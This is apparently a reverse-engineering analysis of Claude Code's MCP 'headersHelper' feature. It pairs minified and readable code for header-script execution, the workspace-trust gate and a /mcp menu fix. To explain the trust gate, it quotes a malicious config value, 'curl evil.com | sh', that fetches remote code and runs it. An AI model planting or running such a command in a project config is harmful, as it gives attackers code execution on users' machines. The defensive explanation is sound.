# `headersHelper` — Dynamic-Header Script + `/mcp` Menu Adaptation

**Versions:** field already in v2.1.88 (`headersHelper` on SSE/HTTP/WS server configs); `/mcp` menu suppresses OAuth actions in **v2.1.110**

## Summary

`headersHelper` is a per-server config field that names a script to execute every time Claude Code connects to an MCP server. The script's stdout (a JSON object) becomes the request headers. This is how teams integrate non-OAuth auth schemes — internal token-vending services, mTLS cert rotation, AWS SigV4-style request signing — into MCP.

The feature was *implemented* in v2.1.88 (it's right there in `services/mcp/headersHelper.ts`), but the **`/mcp` server detail menu was unaware of it** and would happily offer `Authenticate` / `Re-authenticate` actions for any non-`claudeai-proxy` server. v2.1.110 fixed the menu so it suppresses OAuth-only actions when `headersHelper` is configured, and surfaces a more useful error for `needs-auth` states (advising the user to check the helper script rather than authenticate).

## Files Involved

| Version | Path | Lines | What |
|---------|------|------:|------|
| v2.1.88 | `claude-code-kim/src/services/mcp/types.ts` | 63, 94, 104 | `headersHelper: z.string().optional()` on SSE/HTTP/WS schemas |
| v2.1.88 | `claude-code-kim/src/services/mcp/headersHelper.ts` | 32-117 | `getMcpHeadersFromHelper` (script execution + validation) |
| v2.1.88 | `claude-code-kim/src/services/mcp/headersHelper.ts` | 125-138 | `getMcpServerHeaders` (static + dynamic merge) |
| v2.1.112 | `chunks.18.mjs` | 1952, 1959 | `headersHelper` zod field on SSE/HTTP/WS schemas |
| v2.1.112 | `chunks.161.mjs` | 815-845 | `getMcpHeadersFromHelper` (translated to JS) |
| v2.1.112 | `chunks.175.mjs` | 2403 | `else if (!q.config.headersHelper)` — menu OAuth suppression |
| v2.1.112 | `chunks.175.mjs` | 2416 | `V6 = !!q.config.headersHelper` — `Reconnect` enabled for `needs-auth` when helper is set |
| v2.1.112 | `chunks.175.mjs` | 2032-2036 | `formatReconnectResult` — helper-aware error message for `needs-auth` |

## The `headersHelper` Execution Flow

```javascript
// ============================================
// getMcpHeadersFromHelper - run user script to produce dynamic headers per-connect
// Location: chunks.161.mjs:817-847 (v2.1.112) ; src/services/mcp/headersHelper.ts:32-117 (v2.1.88)
// ============================================

// ORIGINAL (for source lookup):
async function oGY(q, K) {
    if (!K.headersHelper) return null;
    if ("scope" in K && rGY(K) && !I7()) {
        if (!EA()) {
            let z = Error(`Security: headersHelper for MCP server '${q}' executed before workspace trust is confirmed. ...`);
            return Kh("MCP headersHelper invoked before trust check", z), d("tengu_mcp_headersHelper_missing_trust", {}), null
        }
    }
    try {
        i8(q, "Executing headersHelper to get dynamic headers");
        let _ = await M7(K.headersHelper, [], {
            shell: !0, timeout: 1e4,
            env: { ...process.env, CLAUDE_CODE_MCP_SERVER_NAME: q, CLAUDE_CODE_MCP_SERVER_URL: K.url }
        });
        if (_.code !== 0 || !_.stdout) throw Error(`headersHelper for MCP server '${q}' did not return a valid value`);
        let z = _.stdout.trim(), Y = n8(z);
        if (typeof Y !== "object" || Y === null || Array.isArray(Y)) throw Error(`headersHelper for MCP server '${q}' must return a JSON object with string key-value pairs`);
        for (let [A, O] of Object.entries(Y))
            if (typeof O !== "string") throw Error(`headersHelper for MCP server '${q}' returned non-string value for key "${A}": ${typeof O}`);
        return i8(q, `Successfully retrieved ${Object.keys(Y).length} headers from headersHelper`), Y
    } catch (_) {
        return yz(q, `Error getting headers from headersHelper: ${b6(_)}`), j6(Error(`Error getting MCP headers from headersHelper for server '${q}': ${b6(_)}`)), null
    }
}

// READABLE (for understanding):
async function getMcpHeadersFromHelper(serverName, config) {
    if (!config.headersHelper) return null;

    // SECURITY GATE: project/local scope requires workspace trust dialog
    if ("scope" in config && isProjectOrLocalScope(config) && !isNonInteractiveSession()) {
        if (!hasTrustDialogAccepted()) {
            const error = new Error(
                `Security: headersHelper for MCP server '${serverName}' executed before workspace trust is confirmed.`
            );
            logAntError("MCP headersHelper invoked before trust check", error);
            logEvent("tengu_mcp_headersHelper_missing_trust");
            return null;   // ← reject, don't crash
        }
    }

    try {
        logMCPDebug(serverName, "Executing headersHelper to get dynamic headers");
        const result = await execFileNoThrow(config.headersHelper, [], {
            shell: true,
            timeout: 10000,
            env: {
                ...process.env,
                CLAUDE_CODE_MCP_SERVER_NAME: serverName,
                CLAUDE_CODE_MCP_SERVER_URL: config.url,
            },
        });

        if (result.code !== 0 || !result.stdout) {
            throw new Error(`headersHelper for MCP server '${serverName}' did not return a valid value`);
        }

        const headers = jsonParse(result.stdout.trim());
        if (typeof headers !== "object" || headers === null || Array.isArray(headers)) {
            throw new Error(`headersHelper for MCP server '${serverName}' must return a JSON object with string key-value pairs`);
        }
        for (const [key, value] of Object.entries(headers)) {
            if (typeof value !== "string") {
                throw new Error(`headersHelper for MCP server '${serverName}' returned non-string value for key "${key}": ${typeof value}`);
            }
        }
        logMCPDebug(serverName, `Successfully retrieved ${Object.keys(headers).length} headers from headersHelper`);
        return headers;
    } catch (error) {
        logMCPError(serverName, `Error getting headers from headersHelper: ${errorMessage(error)}`);
        logError(new Error(`Error getting MCP headers from headersHelper for server '${serverName}': ${errorMessage(error)}`));
        return null;  // ← never throws to caller; failed helper = connection without dynamic headers
    }
}

// Mapping: oGY→getMcpHeadersFromHelper, q→serverName, K→config,
//          rGY→isMcpServerFromProjectOrLocalSettings, I7→getIsNonInteractiveSession,
//          EA→checkHasTrustDialogAccepted, M7→execFileNoThrowWithCwd, n8→jsonParse,
//          i8→logMCPDebug, yz→logMCPError, b6→errorMessage, j6→logError,
//          Kh→logAntError
```

## The `/mcp` Menu Fix (v2.1.110)

The pre-fix behavior was: the `/mcp` server detail menu listed `Authenticate` (for `needs-auth` state) or `Re-authenticate`/`Clear authentication` (for `connected` state) for *any* non-`claudeai-proxy` server, including `headersHelper` servers. Selecting `Authenticate` for a `headersHelper` server made no sense — there's no OAuth flow to invoke. The user would be stuck.

```javascript
// ============================================
// McpServerDetailMenu - menu option selector
// Location: chunks.175.mjs:2380-2430 (v2.1.112)
// ============================================

// ORIGINAL (for source lookup, the relevant block):
if (q.config.type === "claudeai-proxy") {
    if (q.client.type === "connected") W6.push({ label: "Clear authentication", value: "claudeai-clear-auth" });
    else if (q.client.type !== "disabled") W6.push({ label: "Authenticate", value: "claudeai-auth" })
} else if (!q.config.headersHelper) {                              // ← NEW GUARD (v2.1.110)
    if (i) W6.push({ label: "Re-authenticate", value: "reauth" }),
           W6.push({ label: "Clear authentication", value: "clear-auth" });
    if (!i) W6.push({ label: "Authenticate", value: "auth" })
}
let V6 = q.config.type !== "claudeai-proxy" && !!q.config.headersHelper;    // ← V6 = "uses headersHelper, not claudeai-proxy"
if (q.client.type !== "disabled") {
    if (q.client.type !== "needs-auth" || V6) W6.push({ label: "Reconnect", value: "reconnectMcpServer" });
    //                                  ^^^^^ ← Reconnect available for needs-auth when headersHelper used
    W6.push({ label: "Disable", value: "toggle-enabled" })
}

// READABLE (for understanding):
const isClaudeaiProxy = server.config.type === "claudeai-proxy";
const usesHeadersHelper = !isClaudeaiProxy && !!server.config.headersHelper;

if (isClaudeaiProxy) {
    if (state === "connected") menuOptions.push("Clear authentication");
    else if (state !== "disabled") menuOptions.push("Authenticate");
} else if (!usesHeadersHelper) {
    // OAuth-bearing server (no headersHelper): offer Authenticate / Re-authenticate
    if (isAuthenticated) {
        menuOptions.push("Re-authenticate");
        menuOptions.push("Clear authentication");
    } else {
        menuOptions.push("Authenticate");
    }
}

if (state !== "disabled") {
    // Reconnect is offered for non-needs-auth states OR for needs-auth + headersHelper
    // (because that "needs-auth" comes from the helper script failing, not from missing OAuth)
    if (state !== "needs-auth" || usesHeadersHelper) {
        menuOptions.push("Reconnect");
    }
    menuOptions.push("Disable");
}

// Mapping: q→server, W6→menuOptions, V6→usesHeadersHelper, i→isAuthenticated
```

### The `formatReconnectResult` adaptation

When the user picks `Reconnect` and the server still ends up `needs-auth`, the message changes based on whether `headersHelper` is set:

```javascript
// ============================================
// formatReconnectResult - reconnect-result-to-message
// Location: chunks.175.mjs:2028-2047
// ============================================

// ORIGINAL (for source lookup):
function yi8(q, K, _) {
    switch (q.client.type) {
        case "connected":
            return { message: `Reconnected to ${K}.`, success: !0 };
        case "needs-auth":
            return {
                message: _?.hasHeadersHelper
                    ? `${K} requires authentication. Check that the headersHelper script returns valid credentials, then use the 'Reconnect' option.`
                    : `${K} requires authentication. Use the 'Authenticate' option.`,
                success: !1
            };
        case "failed":
            return { message: `Failed to reconnect to ${K}.`, success: !1 };
        // ...
    }
}

// READABLE (for understanding):
function formatReconnectResult(reconnectedClient, serverName, options) {
    switch (reconnectedClient.client.type) {
        case "connected":
            return { message: `Reconnected to ${serverName}.`, success: true };
        case "needs-auth":
            // Different guidance based on auth scheme
            return {
                message: options?.hasHeadersHelper
                    ? `${serverName} requires authentication. Check that the headersHelper script returns valid credentials, then use the 'Reconnect' option.`
                    : `${serverName} requires authentication. Use the 'Authenticate' option.`,
                success: false,
            };
        case "failed":
            return { message: `Failed to reconnect to ${serverName}.`, success: false };
        // ...
    }
}

// Mapping: yi8→formatReconnectResult, q→reconnectedClient, K→serverName, _→options
```

## Why This Approach

**Why a script (not a config map of static headers):** Static `headers: { ... }` is already supported (`McpSSEServerConfig.headers`). `headersHelper` exists for the *dynamic* case: tokens that expire, env-specific credentials, or values that need to come from an OS keychain. The script abstracts the "how to fetch" so Claude Code doesn't need to know about every credential scheme.

**Why JSON object output (not key=value lines):** JSON parsing rejects accidental shell expansions or quoting bugs. A `KEY=VALUE` parser would silently misinterpret `KEY="value with spaces"`. JSON forces well-formed output and supports values that contain `=`, `\n`, etc.

**Why a 10-second timeout:** Helper scripts that block on user input (e.g. a `read -p` prompting for a password) would otherwise hang the MCP connect indefinitely. 10 seconds is generous for any genuine credential-vending tool (typical: 100-500 ms — keychain query, OAuth-client-credentials grant). A timed-out helper returns no headers; the connect proceeds without dynamic headers, which often means the server returns 401 → `needs-auth` state.

**Why pass `CLAUDE_CODE_MCP_SERVER_NAME` and `CLAUDE_CODE_MCP_SERVER_URL` as env vars:** A single helper script can serve multiple MCP servers (similar to git's `credential.helper`). Without these env vars, the helper would have to be configured per-server. The git-credential-helper-style sharing is explicitly cited in the source comment (`See deshaw/anthropic-issues#28`).

**Why the trust check (`hasTrustDialogAccepted`):** A malicious project config could ship `.claude/settings.json` with `headersHelper: "curl evil.com | sh"`. Running that on workspace open, before the user has indicated they trust the directory, would be a remote-code-execution vector. The trust-dialog gate makes the helper opt-in per-workspace.

**Why non-interactive sessions (CI, `-p` mode) skip the trust check:** A CI build of an MCP-enabled project legitimately needs `headersHelper` to fetch tokens from the CI's secret store. Forcing an interactive trust dialog in CI would break the build. The `getIsNonInteractiveSession()` gate trusts CI environments — the assumption is that CI invocation itself is the trust gesture.

**Why menu OAuth-action suppression matters:** For a `headersHelper`-only server, `Authenticate` would route to an OAuth-discovery flow that immediately fails (no `oauth` config). The pre-fix UI was a dead-end button. The fix removes those options and re-enables `Reconnect` for `needs-auth` state — which is the right action: re-run the helper script, get fresh headers, retry the connect.

**The `V6 = !!q.config.headersHelper` trick (line 2416):** Note `Reconnect` is normally suppressed for `needs-auth` (because OAuth state requires `Authenticate` first). For `headersHelper` servers, `needs-auth` arrives from a different cause — the helper script returned bad/expired credentials. The `|| V6` clause re-enables `Reconnect` because that's the only meaningful action.

**Edge case: a server with *both* `oauth` AND `headersHelper`:** v2.1.88's schema permits this — both fields are optional and independent. The v2.1.110 menu treats `headersHelper` as the dominant signal: if `headersHelper` is set, OAuth actions are hidden even if `oauth` is also configured. The implicit policy is "headersHelper is the active auth scheme; OAuth config is residue."

**Key insight:** The fix is a single-line guard (`else if (!q.config.headersHelper)`) plus a single-line option flag (`V6 = !!q.config.headersHelper`) — both checking the *same* config field. This is a classic minimal-diff bug fix where the underlying config has been present for many versions and only the UI logic needed to catch up. The pattern is reusable: any future auth scheme that ships its own `Authenticate` mechanism would just need an additional `else if (!q.config.future_field)` clause and a flag-and-reconnect branch.

## Related Symbols

See [`symbol_additions_unit_14.md`](../00_overview/symbol_additions_unit_14.md) section "Module: MCP — `headersHelper`" and "Module: MCP — `/mcp` Menu".

Key entities:
- `getMcpHeadersFromHelper` (`oGY`, chunks.161.mjs:817-847) - runs the script
- `getMcpServerHeaders` (`cl8`, chunks.161.mjs:848+) - merges static + dynamic
- `formatReconnectResult` (`yi8`, chunks.175.mjs:2028-2047) - helper-aware reconnect message
- `McpServerDetailMenu` (`FP6`, chunks.175.mjs:2054+) - menu component
- `McpSSEServerConfigSchema` (`Bn5`, chunks.18.mjs:1948-1954) - schema with `headersHelper` field
- `execFileNoThrowWithCwd` (`M7`) - the underlying subprocess runner
- `hasTrustDialogAccepted` / `checkHasTrustDialogAccepted` - workspace trust gate
